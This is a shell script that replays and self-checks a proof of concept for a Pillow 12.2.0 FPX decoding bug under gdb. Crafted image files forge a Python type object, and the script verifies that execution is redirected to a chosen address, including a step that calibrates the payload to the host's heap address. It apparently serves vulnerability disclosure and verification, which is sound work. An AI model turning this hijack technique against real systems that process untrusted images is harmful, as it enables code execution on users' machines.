#!/bin/sh
# Self-checking replay for the Pillow W5/W6/W7 forged-type results.
#
# Usage (from this directory or anywhere):
#   PILLOW_BUILD=/path/to/plain-pillow-12.2.0 \
#     sh replay_forged_type.sh [output-directory]
#   sh replay_forged_type.sh --build /path/to/pillow-12.2.0.tar.gz [output-directory]
#
# With --build, the pinned sdist is installed offline into the canonical
# build directory used by the committed logs. Otherwise PILLOW_BUILD must
# point at an existing plain (no sanitizer) Pillow 12.2.0 install; if the
# canonical directory does not exist, a symlink to it is created. The
# canonical path is required: the W7 image carries an absolute brk address,
# and path/cwd/command-line length shift the tile buffer.
#
# All runs are local processes under gdb. gdb's default
# "set disable-randomization on" fixes the inferior's brk address; nothing
# here bypasses the host's ASLR (randomize_va_space=2) or claims a leak.
# No socket, server or external probe is used.
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
CANON=/tmp/pw2-w6/v12plain
OUT=${2:-$HERE/replay-out}
MODE=${1:-}

if [ "$MODE" = "--build" ]; then
    SDIST=${2:-}
    OUT=${3:-$HERE/replay-out}
    [ -n "$SDIST" ] || { echo "FAIL: --build needs an sdist path" >&2; exit 2; }
    [ -f "$SDIST" ] || { echo "FAIL: missing sdist $SDIST" >&2; exit 2; }
    if [ ! -d "$CANON" ]; then
        mkdir -p "$(dirname "$CANON")"
        python3 -m pip install --no-binary :all: --no-deps \
            --target "$CANON" "$SDIST"
    fi
elif [ "$MODE" != "" ] && [ "$MODE" != "--existing" ]; then
    OUT=$1
fi

BUILD=${PILLOW_BUILD:-}
if [ ! -d "$CANON" ]; then
    [ -n "$BUILD" ] || { echo "FAIL: set PILLOW_BUILD or use --build" >&2; exit 2; }
    [ -d "$BUILD" ] || { echo "FAIL: PILLOW_BUILD is not a directory: $BUILD" >&2; exit 2; }
    ln -s "$(cd "$BUILD" && pwd)" "$CANON"
fi
PYTHONPATH="$CANON" python3 -c \
    'import PIL, olefile; assert PIL.__version__ == "12.2.0", PIL.__version__' || {
    echo "FAIL: canonical build is not plain Pillow 12.2.0 + olefile" >&2
    exit 2
}
mkdir -p "$OUT" /tmp/pw2-w4 /tmp/pw2-w7
cd "$HERE"

PASS=0
FAIL=0
INFO=0
check() {
    name=$1
    log=$2
    shift 2
    ok=1
    for needle in "$@"; do
        case $needle in
            !*)
                if grep -Fq "${needle#!}" "$log"; then
                    echo "FAIL $name: unexpected ${needle#!}"
                    ok=0
                fi
                ;;
            *)
                if ! grep -Fq "$needle" "$log"; then
                    echo "FAIL $name: missing $needle"
                    ok=0
                fi
                ;;
        esac
    done
    if [ "$ok" -eq 1 ]; then
        echo "PASS $name"
        PASS=$((PASS + 1))
    else
        FAIL=$((FAIL + 1))
    fi
}
check_soft() {
    name=$1
    log=$2
    shift 2
    ok=1
    for needle in "$@"; do
        case $needle in
            !*)
                grep -Fq "${needle#!}" "$log" && ok=0
                ;;
            *)
                grep -Fq "$needle" "$log" || ok=0
                ;;
        esac
    done
    if [ "$ok" -eq 1 ]; then
        echo "PASS $name"
        PASS=$((PASS + 1))
    else
        echo "INFO $name: fixed-address layout does not match this host"
        INFO=$((INFO + 1))
    fi
}

sha_check() {
    name=$1
    want=$2
    got=$(sha256sum "$name" | cut -d' ' -f1)
    if [ "$got" = "$want" ]; then
        echo "PASS sha-$name"
        PASS=$((PASS + 1))
    else
        echo "FAIL sha-$name: got $got want $want"
        FAIL=$((FAIL + 1))
    fi
}

# The command line is part of the W5-W7 layout: keep the exact -c strings.
run() {
    name=$1
    script=$2
    casefile=$3
    code=$4
    PYTHONPATH="$CANON" gdb -q -batch -x "$script" --args python3 -c \
        "from PIL import Image; Image.open(\"$casefile\").load()$code" \
        > "$OUT/$name.log" 2>&1 || true
}


sha_check case_fake.fpx \
    6c59dd01bc9c8a77e7d84d77b8ef8b79f77d2b3ef7678b880604098f80ffedea
sha_check case_file.fpx \
    5e336b88a823c0f11b1c534781e36611f2ebefc10533b0c55911735126770788
sha_check case_ctrl.fpx \
    891ac80d3f8e9367c5c14bf8f69c8971376e1c3f92007676e8e3146cfded0313

run w5_self forged_type_self.gdb case_fake.fpx ''
check w5_self "$OUT/w5_self.log" \
    'AFTER_DECODE type=d32f90 fake=d32f90' \
    'OBTYPE_FROM_OOB=d32f90 forged_slot=45e6e6 MATCH=1' \
    'Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()'

run w5_control forged_type_control.gdb case_fake.fpx ''
check w5_control "$OUT/w5_control.log" \
    'CONTROL faketype=d32f90 tp_dealloc=5a8450 objtype=d32f90' \
    'in PyObject_Free ()' \
    '!Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()'

run w6_natural forged_type_natural.gdb case_fake.fpx '; print("LOAD_OK")'
check w6_natural "$OUT/w6_natural.log" \
    'LOAD_OK' \
    'OBTYPE_FROM_OOB=d32f90 forged_slot=45e6e6 MATCH=1' \
    'AFTER_CONTINUE pc=0x45e6e6' \
    'in Py_FinalizeEx ()'

run w6_control forged_type_natural_control.gdb case_fake.fpx '; print("LOAD_OK")'
check_soft w6_control "$OUT/w6_control.log" \
    'OBTYPE_FROM_OOB=d32f90 real_slot=5a8450 MATCH=1' \
    'SIGABRT' \
    'double free or corruption (!prev)' \
    '!Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()'

# The committed W7 files bake one host's brk address into the image. Report
# their result but do not fail the replay when this host's layout differs.
run w7_file forged_type_file.gdb case_file.fpx ''
check_soft w7_file "$OUT/w7_file.log" \
    'PTR184=d32f90 FAKE48=45e6e6 MATCH=1' \
    'HIT pc=0x45e6e6' \
    'in Py_FinalizeEx ()'

run w7_control forged_type_file.gdb case_ctrl.fpx ''
check_soft w7_control "$OUT/w7_control.log" \
    'PTR184=d32f90 FAKE48=5a8450 MATCH=1' \
    'HIT pc=0x5a8497' \
    '!Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()'

# Authoritative W7 check: measure this process's buffer address, regenerate
# the image-only case for it, and read the forged address from the image.
mkdir -p /tmp/pw2-w7cal
run w7_probe probe_buffer.gdb case_file.fpx ''
BUFADDR=$(grep -m1 -o 'BUFADDR=[0-9a-f]*' "$OUT/w7_probe.log" | cut -d= -f2)
if [ -z "$BUFADDR" ]; then
    echo "FAIL w7_probe: no BUFADDR in $OUT/w7_probe.log"
    FAIL=$((FAIL + 1))
else
    FAKE=$(printf '%x' $((0x$BUFADDR + 720)))
    if PYTHONPATH="$CANON" python3 calibrate_file_case.py "$OUT" "$BUFADDR" \
        /tmp/pw2-w7cal/realtype.bin > "$OUT/w7_calibrate.log" 2>&1; then
        cp "$OUT/case_cal1.fpx" "$OUT/case_cal2.fpx" .
        trap 'rm -f case_cal1.fpx case_cal2.fpx' EXIT
        REALSLOT=$(grep -m1 -o 'REAL_SLOT=[0-9a-f]*' "$OUT/w7_calibrate.log" | cut -d= -f2)
        REALSLOT=$(printf '%x' $((0x$REALSLOT)))
        run w7_cal_file forged_type_file_dyn.gdb case_cal1.fpx ''
        check w7_cal_file "$OUT/w7_cal_file.log" \
            "PTR184=$FAKE FAKE48=45e6e6 MATCH=1" \
            'HIT pc=0x45e6e6' \
            'in Py_FinalizeEx ()'
        run w7_cal_ctrl forged_type_file_dyn.gdb case_cal2.fpx ''
        check w7_cal_ctrl "$OUT/w7_cal_ctrl.log" \
            "PTR184=$FAKE FAKE48=$REALSLOT MATCH=1" \
            'Program received signal SIGSEGV' \
            'HIT pc=0x' \
            '!Breakpoint 2, 0x000000000045e6e6 in _PyObject_Dump ()'
    else
        echo "FAIL w7_calibrate: see $OUT/w7_calibrate.log"
        FAIL=$((FAIL + 1))
    fi
fi

echo "TOTAL PASS=$PASS FAIL=$FAIL INFO=$INFO"
[ "$FAIL" -eq 0 ]
